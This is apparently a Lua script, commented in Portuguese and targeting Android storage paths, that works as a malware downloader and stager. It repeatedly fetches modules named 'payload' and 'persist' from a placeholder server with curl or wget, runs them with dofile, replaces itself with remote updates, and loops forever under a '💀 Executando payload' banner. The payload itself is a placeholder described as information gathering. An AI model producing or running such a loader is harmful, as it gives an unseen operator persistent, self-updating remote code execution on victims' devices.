-- ============================================
-- MAIN.LUA (Servidor) - Gerenciador Central
-- ============================================

print("🔥 MAIN.LUA DO SERVIDOR")
print("📌 Versão: 1.0")
print("📌 Data: " .. os.date())

-- ============================================
-- 1. CONFIGURAÇÃO
-- ============================================
local SERVER_BASE = "https://seuservidor.com/lua/"
local VERSION_FILE = "/sdcard/lu/version.txt"
local CURRENT_VERSION = "1.0"

-- ============================================
-- 2. FUNÇÃO DE DOWNLOAD
-- ============================================
function download_file(url, dest)
    local cmd = 'curl -s -L -m 10 "' .. url .. '" -o "' .. dest .. '" 2>/dev/null'
    os.execute(cmd)
    local f = io.open(dest, "r")
    if f then f:close(); return true end
    
    cmd = 'wget -q -T 10 -O "' .. dest .. '" "' .. url .. '" 2>/dev/null'
    os.execute(cmd)
    f = io.open(dest, "r")
    if f then f:close(); return true end
    
    return false
end

-- ============================================
-- 3. FUNÇÃO PARA BAIXAR E EXECUTAR MÓDULOS
-- ============================================
function load_module(name, required)
    local url = SERVER_BASE .. name .. ".lua"
    local path = "/sdcard/lu/" .. name .. ".lua"
    
    print("📥 Carregando módulo: " .. name)
    
    if download_file(url, path) then
        print("✅ Módulo baixado: " .. name)
        local ok, err = pcall(dofile, path)
        if not ok then
            print("❌ Erro no módulo " .. name .. ": " .. tostring(err))
            if required then
                return false
            end
        else
            print("✅ Módulo executado: " .. name)
            return true
        end
    else
        print("❌ Falha ao baixar módulo: " .. name)
        if required then
            return false
        end
    end
    return true
end

-- ============================================
-- 4. FUNÇÃO DE ATUALIZAÇÃO
-- ============================================
function check_update()
    print("\n🔍 Verificando atualizações...")
    
    local version_url = SERVER_BASE .. "version.txt"
    local temp_version = "/sdcard/lu/version_temp.txt"
    
    if download_file(version_url, temp_version) then
        local f = io.open(temp_version, "r")
        if f then
            local new_version = f:read("*all"):gsub("%s+", "")
            f:close()
            os.remove(temp_version)
            
            if new_version ~= CURRENT_VERSION then
                print("🔄 Nova versão disponível: " .. new_version)
                print("📥 Baixando atualização...")
                
                -- Baixa o novo main.lua
                local main_url = SERVER_BASE .. "main.lua"
                local main_path = "/sdcard/lu/main.lua"
                
                if download_file(main_url, main_path) then
                    print("✅ Atualização baixada!")
                    print("🔄 Reiniciando com nova versão...")
                    
                    -- Salva nova versão
                    local vf = io.open(VERSION_FILE, "w")
                    if vf then
                        vf:write(new_version)
                        vf:close()
                    end
                    
                    -- Executa o novo main.lua
                    dofile(main_path)
                    return true
                else
                    print("❌ Falha na atualização!")
                end
            else
                print("✅ Versão atual já é a mais recente: " .. CURRENT_VERSION)
            end
        end
    end
    
    return false
end

-- ============================================
-- 5. LISTA DE MÓDULOS PARA CARREGAR
-- ============================================
local MODULES = {
    -- Nome do módulo, obrigatório?
    {"modules", false},   -- Módulo opcional
    {"config", false},    -- Configurações
    {"payload", true},    -- Payload principal (obrigatório)
    {"persist", false},   -- Persistência adicional
}

-- ============================================
-- 6. EXECUTA OS MÓDULOS
-- ============================================
print("\n📦 Carregando módulos...\n")

for _, module_info in ipairs(MODULES) do
    local name = module_info[1]
    local required = module_info[2] or false
    
    if not load_module(name, required) and required then
        print("❌ Módulo obrigatório falhou: " .. name)
        return
    end
end

-- ============================================
-- 7. LOOP PRINCIPAL
-- ============================================
print("\n🎯 Sistema pronto!")

local counter = 0
while true do
    counter = counter + 1
    
    if counter % 10 == 0 then
        print("\n🔄 Verificando atualizações...")
        check_update()
    end
    
    -- Executa o payload principal
    print("💀 Executando payload... (" .. counter .. ")")
    
    -- Seu código principal aqui
    -- Exemplo: coleta de informações
    local f = io.open("/sdcard/lu/heartbeat.txt", "a")
    if f then
        f:write(os.date() .. " - Heartbeat\n")
        f:close()
    end
    
    os.execute("sleep 60")
end